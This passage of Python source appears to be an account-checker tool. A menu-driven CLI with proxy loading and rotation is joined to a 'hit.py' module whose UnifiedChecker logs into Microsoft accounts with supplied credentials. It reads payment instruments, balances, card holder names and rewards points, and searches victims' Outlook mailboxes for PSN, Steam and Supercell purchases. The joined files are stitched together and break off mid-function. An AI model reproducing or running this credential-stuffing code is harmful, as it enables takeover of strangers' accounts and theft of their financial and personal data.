            console.print("[+] Value unchanged", style="yellow")
            return

        # Convert value based on key
        if key in ['timeout', 'max_threads', 'retry_count']:
            try:
                new_value = int(new_value)
                if new_value < 1:
                    console.print("[!] Value must be positive", style="red")
                    return
            except ValueError:
                console.print("[!] Invalid number", style="red")
                return
        elif key in ['save_invalid', 'auto_save']:
            new_value = new_value.lower() in ['true', '1', 'yes', 'on', 'enabled']
        elif key == 'selected_category':
            valid_categories = ['Minecraft', 'Roblox', 'League of Legends', 'Overwatch', 'Sea of Thieves', 'Game Pass', 'GIFTCARDS', 'All']
            if new_value not in valid_categories:
                console.print(f"[!] Invalid category. Valid options: {', '.join(valid_categories)}", style="red")
                return

        self.settings.set(key, new_value)
        console.print(f"[+] {key} updated to: {new_value}", style="green")
        time.sleep(1)

    def proxy_menu(self):
        """Display proxy menu and handle user input"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 22 + "PROXY MENU" + " " * 26 + "║", style="cyan")
            console.print("╠" + "═"*58 + "╣", style="cyan")
            console.print("║  1. Load Proxies - Add proxies to list                   ║", style="cyan")
            console.print("║  2. View Proxies - Show current proxy list               ║", style="cyan")
            console.print("║  3. Check Proxies - Test proxy connectivity              ║", style="cyan")
            console.print("║  4. Proxy Settings - Configure proxy checking            ║", style="cyan")
            console.print("║  5. Go Back - Return to main menu                        ║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")

            console.print(f"\nCurrent proxies: {len(self.proxy_manager.proxies)}", style="yellow")
            console.print(f"Working proxies: {len(self.proxy_manager.working_proxies)}", style="green")
            console.print("\nSelect option (1-5): ", style="cyan", end="")

            try:
                choice = input().strip()

                if choice == '1':
                    self.load_proxies()
                elif choice == '2':
                    self.view_proxies()
                elif choice == '3':
                    self.check_proxies()
                elif choice == '4':
                    self.proxy_settings_menu()
                elif choice == '5':
                    break
                else:
                    console.print("\n[!] Invalid option. Please try again.", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                break

    def load_proxies(self):
        """Load proxies from file or manual input"""
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + "LOAD PROXIES" + " " * 21 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        console.print("\n1. Load from file")
        console.print("2. Add manually")
        console.print("3. Back")
        console.print("\nSelect option (1-3): ", style="cyan", end="")

        choice = input().strip()

        if choice == '1':
            root = Tk()
            root.withdraw()
            root.attributes('-topmost', True)

            file_path = filedialog.askopenfilename(
                title="Select Proxy File",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )

            root.destroy()

            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        new_proxies = [line.strip() for line in f if line.strip()]

                    added = 0
                    for proxy in new_proxies:
                        if self.proxy_manager.add_proxy(proxy):
                            added += 1

                    self.proxy_manager.save_proxies()
                    console.print(f"[+] Added {added} new proxies (total: {len(self.proxy_manager.proxies)})", style="green")
                except Exception as e:
                    console.print(f"[!] Error loading file: {e}", style="red")

        elif choice == '2':
            console.print("\nEnter proxies (one per line, empty line to finish):")
            proxies = []
            while True:
                proxy = input().strip()
                if not proxy:
                    break
                proxies.append(proxy)

            added = 0
            for proxy in proxies:
                if self.proxy_manager.add_proxy(proxy):
                    added += 1

            if added > 0:
                self.proxy_manager.save_proxies()
                console.print(f"[+] Added {added} new proxies (total: {len(self.proxy_manager.proxies)})", style="green")
            else:
                console.print("[!] No new proxies added", style="yellow")

        time.sleep(2)

    def view_proxies(self):
        """View current proxy list"""
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + "VIEW PROXIES" + " " * 21 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")

        if not self.proxy_manager.proxies:
            console.print("\n[!] No proxies loaded", style="yellow")
        else:
            console.print(f"\nTotal proxies: {len(self.proxy_manager.proxies)}", style="cyan")
            console.print(f"Working proxies: {len(self.proxy_manager.working_proxies)}", style="green")

            console.print("\nFirst 10 proxies:")
            for i, proxy in enumerate(self.proxy_manager.proxies[:10], 1):
                status = "✓" if proxy in self.proxy_manager.working_proxies else "✗"
                console.print(f"  {i:2d}. {proxy} [{status}]", style="green" if status == "✓" else "red")

            if len(self.proxy_manager.proxies) > 10:
                console.print(f"  ... and {len(self.proxy_manager.proxies) - 10} more", style="yellow")

        input("\nPress Enter to continue...")

    def check_proxies(self):
        """Check proxy connectivity"""
        if not self.proxy_manager.proxies:
            console.print("\n[!] No proxies to check", style="yellow")
            time.sleep(2)
            return

        self.proxy_manager.test_all_proxies()
        input("\nPress Enter to continue...")

    def proxy_settings_menu(self):
        """Configure proxy settings"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 21 + "PROXY SETTINGS" + " " * 22 + "║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")

            settings = self.proxy_manager.proxy_settings
            console.print(f"\n1. Use Proxies: {'Enabled' if settings['use_proxies'] else 'Disabled'}")
            console.print(f"2. Test Timeout: {settings['timeout']}s")
            console.print(f"3. Test URL: {settings['test_url']}")
            console.print(f"4. Check Threads: {settings['check_threads']}")
            console.print(f"5. Rotate Proxies: {'Enabled' if settings['rotate'] else 'Disabled'}")
            console.print(f"6. Remove Failed: {'Enabled' if settings['remove_failed'] else 'Disabled'}")
            console.print("\n7. Back")
            console.print("\nSelect setting to modify (1-7): ", style="cyan", end="")

            try:
                choice = input().strip()

                if choice == '1':
                    settings['use_proxies'] = not settings['use_proxies']
                    status = "enabled" if settings['use_proxies'] else "disabled"
                    console.print(f"\n[+] Proxy usage {status} for scraping", style="green")
                    if settings['use_proxies'] and not self.proxy_manager.working_proxies:
                        console.print("[!] Warning: No working proxies available", style="yellow")
                    self.proxy_manager.save_settings()  # Save settings

                elif choice == '2':
                    console.print(f"\nCurrent timeout: {settings['timeout']}")
                    console.print("Enter new timeout (seconds): ", style="cyan", end="")
                    try:
                        new_val = int(input().strip())
                        if new_val > 0:
                            settings['timeout'] = new_val
                            console.print("[+] Timeout updated", style="green")
                            self.proxy_manager.save_settings()  # Save settings
                        else:
                            console.print("[!] Timeout must be positive", style="red")
                    except:
                        console.print("[!] Invalid number", style="red")

                elif choice == '3':
                    console.print(f"\nCurrent test URL: {settings['test_url']}")
                    console.print("Enter new test URL: ", style="cyan", end="")
                    new_val = input().strip()
                    if new_val:
                        settings['test_url'] = new_val
                        console.print("[+] Test URL updated", style="green")
                        self.proxy_manager.save_settings()  # Save settings

                elif choice == '4':
                    console.print(f"\nCurrent check threads: {settings['check_threads']}")
                    console.print("Enter new thread count (1-200): ", style="cyan", end="")
                    try:
                        new_val = int(input().strip())
                        if 1 <= new_val <= 200:
                            settings['check_threads'] = new_val
                            console.print("[+] Check threads updated", style="green")
                            self.proxy_manager.save_settings()  # Save settings
                        else:
                            console.print("[!] Threads must be between 1 and 200", style="red")
                    except:
                        console.print("[!] Invalid number", style="red")

                elif choice == '5':
                    settings['rotate'] = not settings['rotate']
                    console.print(f"[+] Proxy rotation {'enabled' if settings['rotate'] else 'disabled'}", style="green")
                    self.proxy_manager.save_settings()  # Save settings

                elif choice == '6':
                    settings['remove_failed'] = not settings['remove_failed']
                    console.print(f"[+] Remove failed proxies {'enabled' if settings['remove_failed'] else 'disabled'}", style="green")
                    self.proxy_manager.save_settings()  # Save settings

                elif choice == '7':
                    break
                else:
                    console.print("\n[!] Invalid option", style="red")

                time.sleep(1)
            except KeyboardInterrupt:
                break

    def run(self):
        """Run the application"""
        self.show_main_menu()


def flux_cli_main():
    """Main entry point"""
    try:
        app = RewardsApp()
        app.run()
    except KeyboardInterrupt:
        console.print("\n[+] Goodbye!", style="green")
    except Exception as e:
        console.print(f"\n[!] Fatal error: {e}", style="red")
        input("Press Enter to exit...")


if False: # cli entry
    main()

# ============================================================================
# HIT.PY SOURCE (1900+ lines)
# ============================================================================
import requests
import json
import uuid
import re
import time
import os
import sys
import csv
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from urllib.parse import quote, unquote

class Colors:
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BRIGHT_RED = '\033[1;91m'
    BRIGHT_GREEN = '\033[1;92m'
    BRIGHT_YELLOW = '\033[1;93m'
    BRIGHT_BLUE = '\033[1;94m'
    BRIGHT_MAGENTA = '\033[1;95m'
    BRIGHT_CYAN = '\033[1;96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    END = '\033[0m'

class EnhancedCategories:
    """Enhanced categories for better organization"""

    @staticmethod
    def get_all_categories():
        return {
            "microsoft": {
                "name": "Microsoft",
                "subcategories": {
                    "xbox_ultimate": "Xbox Game Pass Ultimate",
                    "xbox_pc": "PC Game Pass",
                    "xbox_console": "Xbox Game Pass",
                    "xbox_live": "Xbox Live Gold",
                    "ea_play": "EA Play",
                    "m365_family": "Microsoft 365 Family",
                    "m365_personal": "Microsoft 365 Personal",
                    "office": "Office 365",
                    "onedrive": "OneDrive Premium",
                    "teams": "Microsoft Teams",
                    "balance": "Microsoft Balance",
                    "rewards": "Bing Rewards",
                    "free": "Microsoft Free"
                }
            },
            "gaming": {
                "name": "Gaming",
                "subcategories": {
                    "psn_orders": "PSN Orders",
                    "psn_plus": "PlayStation Plus",
                    "steam": "Steam Purchases",
                    "epic": "Epic Games",
                    "ubisoft": "Ubisoft",
                    "ea_app": "EA App",
                    "riot": "Riot Games",
                    "nintendo": "Nintendo"
                }
            },
            "mobile_games": {
                "name": "Mobile Games",
                "subcategories": {
                    "supercell_all": "Supercell Games",
                    "clash_royale": "Clash Royale",
                    "clash_of_clans": "Clash of Clans",
                    "brawl_stars": "Brawl Stars",
                    "hay_day": "Hay Day",
                    "genshin": "Genshin Impact",
                    "cod_mobile": "COD Mobile",
                    "pubg": "PUBG Mobile",
                    "free_fire": "Free Fire",
                    "mlbb": "Mobile Legends",
                    "pokemon_go": "Pokémon GO",
                    "roblox": "Roblox",
                    "fortnite": "Fortnite",
                    "minecraft_pe": "Minecraft PE"
                }
            },
            "social_media": {
                "name": "Social Media",
                "subcategories": {
                    "tiktok": "TikTok",
                    "instagram": "Instagram",
                    "facebook": "Facebook",
                    "twitter": "Twitter/X",
                    "snapchat": "Snapchat",
                    "discord": "Discord",
                    "telegram": "Telegram",
                    "whatsapp": "WhatsApp",
                    "reddit": "Reddit",
                    "linkedin": "LinkedIn",
                    "twitch": "Twitch",
                    "youtube": "YouTube"
                }
            },
            "streaming": {
                "name": "Streaming",
                "subcategories": {
                    "netflix": "Netflix",
                    "disney_plus": "Disney+",
                    "hulu": "Hulu",
                    "hbo_max": "HBO Max",
                    "amazon_prime": "Amazon Prime",
                    "apple_tv": "Apple TV+",
                    "youtube_premium": "YouTube Premium",
                    "spotify": "Spotify",
                    "apple_music": "Apple Music"
                }
            },
            "ecommerce": {
                "name": "Shopping",
                "subcategories": {
                    "amazon": "Amazon",
                    "amazon_prime": "Amazon Prime",
                    "ebay": "eBay",
                    "aliexpress": "AliExpress",
                    "paypal": "PayPal",
                    "stripe": "Stripe",
                    "shopify": "Shopify",
                    "nike": "Nike",
                    "adidas": "Adidas"
                }
            },
            "finance": {
                "name": "Finance",
                "subcategories": {
                    "paypal_balance": "PayPal Balance",
                    "venmo": "Venmo",
                    "cashapp": "Cash App",
                    "revolut": "Revolut",
                    "wise": "Wise",
                    "skrill": "Skrill",
                    "payoneer": "Payoneer"
                }
            },
            "cloud_storage": {
                "name": "Cloud Storage",
                "subcategories": {
                    "google_drive": "Google Drive",
                    "dropbox": "Dropbox",
                    "onedrive": "OneDrive",
                    "icloud": "iCloud",
                    "mega": "MEGA",
                    "pcloud": "pCloud"
                }
            },
            "vpn": {
                "name": "VPN",
                "subcategories": {
                    "nordvpn": "NordVPN",
                    "expressvpn": "ExpressVPN",
                    "surfshark": "Surfshark",
                    "cyberghost": "CyberGhost",
                    "protonvpn": "ProtonVPN",
                    "windscribe": "Windscribe"
                }
            },
            "food_delivery": {
                "name": "Food Delivery",
                "subcategories": {
                    "ubereats": "Uber Eats",
                    "doordash": "DoorDash",
                    "grubhub": "Grubhub",
                    "deliveroo": "Deliveroo",
                    "foodpanda": "Foodpanda"
                }
            },
            "travel": {
                "name": "Travel",
                "subcategories": {
                    "uber": "Uber",
                    "lyft": "Lyft",
                    "airbnb": "Airbnb",
                    "booking": "Booking.com",
                    "expedia": "Expedia",
                    "skyscanner": "Skyscanner"
                }
            },
            "education": {
                "name": "Education",
                "subcategories": {
                    "coursera": "Coursera",
                    "udemy": "Udemy",
                    "skillshare": "Skillshare",
                    "masterclass": "MasterClass",
                    "duolingo": "Duolingo",
                    "grammarly": "Grammarly"
                }
            }
        }

    @staticmethod
    def get_category_color(category_id):
        """Color codes for each main category"""
        colors = {
            "microsoft": Colors.BRIGHT_MAGENTA,
            "gaming": Colors.BRIGHT_BLUE,
            "mobile_games": Colors.BRIGHT_YELLOW,
            "social_media": Colors.MAGENTA,
            "streaming": Colors.BRIGHT_RED,
            "ecommerce": Colors.BRIGHT_GREEN,
            "finance": Colors.GREEN,
            "cloud_storage": Colors.CYAN,
            "vpn": Colors.BLUE,
            "food_delivery": Colors.RED,
            "travel": Colors.BRIGHT_CYAN,
            "education": Colors.BRIGHT_BLUE
        }
        return colors.get(category_id, Colors.WHITE)

class UnifiedChecker:
    def __init__(self, keywords=None, debug=False, api_mode=1, check_mode="hotmail"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode
        self.check_mode = check_mode
        self.categories = EnhancedCategories()

    def log(self, message):
        if self.debug:
            print(f"{Colors.DIM}[DEBUG] {message}{Colors.END}")

    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""

    def parse_name_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                for key in ['name', 'givenName', 'fullName']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""

    def extract_inbox_count(self, text):
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    return match.group(1)
        except:
            pass
        return "0"

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"

    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        """Check Xbox, Microsoft 365, and other Microsoft subscriptions"""
        try:
            self.log("Checking Microsoft subscriptions...")
            time.sleep(0.5)

            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"

            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }

            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r.text + " " + r.url

            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]

            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "subscriptions": []}

            self.log("Payment token obtained")
            sub_data = {}
            subscriptions = []

            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": str(uuid.uuid4()),
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }

            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                if r_pay.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                    if balance_match:
                        sub_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
                    if card_match:
                        sub_data['card_holder'] = card_match.group(1)
            except:
                pass

            try:
                rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    sub_data['rewards_points'] = points_match.group(1)
            except:
                pass

            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)

                if r_sub.status_code == 200:
                    response_text = r_sub.text
                    subscription_keywords = {
                        'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'microsoft', 'subcategory': 'xbox_ultimate'},
                        'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'microsoft', 'subcategory': 'xbox_pc'},
                        'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'microsoft', 'subcategory': 'xbox_console'},
                        'EA Play': {'type': 'EA PLAY', 'category': 'microsoft', 'subcategory': 'ea_play'},
                        'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'microsoft', 'subcategory': 'xbox_live'},
                        'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'microsoft', 'subcategory': 'm365_family'},
                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'microsoft', 'subcategory': 'm365_personal'},
                        'Office 365': {'type': 'OFFICE 365', 'category': 'microsoft', 'subcategory': 'office'},
                        'OneDrive': {'type': 'ONEDRIVE', 'category': 'cloud_storage', 'subcategory': 'onedrive'},
                    }

                    for keyword, info in subscription_keywords.items():
                        if keyword in response_text:
                            sub_info = {
                                'name': info['type'],
                                'category': info['category'],
                                'subcategory': info['subcategory']
                            }

                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                            if title_match:
                                sub_info['title'] = title_match.group(1)

                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                renewal_date = renewal_match.group(1)
                                sub_info['renewal_date'] = renewal_date
                                days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                sub_info['days_remaining'] = days_remaining

                                try:
                                    if int(days_remaining) < 0:
                                        sub_info['is_expired'] = True
                                except:
                                    pass

                            auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                            if auto_match:
                                sub_info['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"

                            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                            if amount_match:
                                sub_info['amount'] = amount_match.group(1)

                            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                            if currency_match:
                                sub_info['currency'] = currency_match.group(1)

                            subscriptions.append(sub_info)

                    if subscriptions:
                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
                        if active_subs:
                            return {"status": "PREMIUM", "subscriptions": subscriptions, "data": sub_data}
                        else:
                            return {"status": "FREE", "subscriptions": subscriptions, "data": sub_data}
                    else:
                        return {"status": "FREE", "subscriptions": [], "data": sub_data}
            except:
                return {"status": "FREE", "subscriptions": [], "data": sub_data}

            return {"status": "FREE", "subscriptions": [], "data": sub_data}

        except Exception as e:
            self.log(f"Subscription check error: {str(e)}")
            return {"status": "ERROR", "subscriptions": [], "data": {}}

    def check_psn(self, email, access_token, cid):
        """Check PlayStation Network orders with detailed purchase info"""
        try:
            self.log("Checking PSN...")
            search_url = "https://outlook.live.com/search/api/v2/query"

            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }

            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)

            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0

                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)

                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}

                                if 'Preview' in result:
                                    preview = result['Preview']
                                    full_text = result.get('ItemBody', {}).get('Content', preview)

                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                        r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                        r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    ]

                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name)
                                            item_name = item_name.replace('\\r', '').replace('\\n', '')
                                            if len(item_name) > 5 and len(item_name) < 100:
                                                purchase_info['item'] = item_name
                                                break

                                    if not purchase_info.get('item') and 'Subject' in result:
                                        subject = result['Subject']
                                        subject_patterns = [
                                            r'Your PlayStation.*?purchase.*?:\s*([^\|]+)',
                                            r'Receipt.*?:\s*([^\|]+)',
                                            r'Order.*?:\s*([^\|]+)',
                                        ]
                                        for pattern in subject_patterns:
                                            match = re.search(pattern, subject, re.IGNORECASE)
                                            if match:
                                                purchase_info['item'] = match.group(1).strip()
                                                break

                                    price_patterns = [
                                        r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                        r'[\$€£¥]\s*(\d+[\.,]\d{2})\s*(?:USD|EUR|GBP|JPY)',
                                        r'(\d+[\.,]\d{2})\s*[\$€£¥]',
                                    ]
                                    for pattern in price_patterns:
                                        price_match = re.search(pattern, full_text)
                                        if price_match:
                                            purchase_info['price'] = price_match.group(0)
                                            break

                                    order_match = re.search(r'Order\s*(?:Number|#)[\s:]*([A-Z0-9\-]+)', full_text, re.IGNORECASE)
                                    if order_match:
                                        purchase_info['order_id'] = order_match.group(1)

                                if 'ReceivedTime' in result:
                                    try:
                                        date_str = result['ReceivedTime']
                                        date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                        purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                    except:
                                        pass

                                if purchase_info and purchase_info.get('item'):
                                    purchases.append(purchase_info)

                if total_orders > 0:
                    return {
                        "psn_status": "HAS_ORDERS",
                        "psn_orders": total_orders,
                        "purchases": purchases,
                        "category": "gaming",
                        "subcategory": "psn_orders"
                    }
                else:
                    return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}

            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}

        except Exception as e:
            self.log(f"PSN check error: {str(e)}")
            return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}

    def check_steam(self, email, access_token, cid):
        """Check Steam purchases"""
        try:
            self.log("Checking Steam...")
            search_url = "https://outlook.live.com/search/api/v2/query"

            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@steampowered.com purchase"},
                    "Size": 30,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }

            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)

            if r.status_code == 200:
                data = r.json()
                purchases = []
                total = 0

                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)

                        if 'Results' in result_set:
                            for result in result_set['Results'][:5]:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    game_match = re.search(r'Thank you for your.*?purchase.*?:\s*([^\.]+)', preview, re.IGNORECASE)
                                    if game_match:
                                        purchases.append({'game': game_match.group(1).strip()})

                if total > 0:
                    return {
                        "steam_status": "HAS_PURCHASES",
                        "steam_count": total,
                        "purchases": purchases,
                        "category": "gaming",
                        "subcategory": "steam"
                    }
                else:
                    return {"steam_status": "FREE", "steam_count": 0, "purchases": []}

            return {"steam_status": "FREE", "steam_count": 0, "purchases": []}

        except Exception as e:
            self.log(f"Steam check error: {str(e)}")
            return {"steam_status": "ERROR", "steam_count": 0, "purchases": []}

    def check_supercell(self, email, access_token, cid):
        """Check Supercell games"""
        try:
            self.log("Checking Supercell...")
            search_url = "https://outlook.live.com/search/api/v2/query"

            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@id.supercell.com"},
                    "Size": 20,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }

            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)

            if r.status_code == 200:
                data = r.json()
                games = []

                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)

                        if total > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']

                                    game_checks = {
                                        'Clash Royale': 'Clash Royale' in preview or 'Royale' in preview,
                                        'Clash of Clans': 'Clash of Clans' in preview or 'Clans' in preview,
                                        'Brawl Stars': 'Brawl Stars' in preview or 'Brawl' in preview,
                                        'Hay Day': 'Hay Day' in preview
                                    }

                                    for game, found in game_checks.items():
                                        if found and game not in games:
                                            games.append(game)

                        if games:
                            return {
                                "supercell_status": "LINKED",
                                "games": games,
                                "category": "mobile_games",
                                "subcategory": "supercell_all"
                            }

                return {"supercell_status": "FREE", "games": []}

            return {"supercell_status": "FREE", "games": []}

        except Exception as e:
            self.log(f"Supercell check error: {str(e)}")
            return {"supercell_status": "ERROR", "games": []}

    def check_tiktok(self, email, access_token, cid):
        """Check TikTok account"""
        try:
            self.log("Checking TikTok...")
            search_url = "https://outlook.live.com/search/api/v2/query"

            payload = {
                "Cvid": str(uuid.uuid4()),
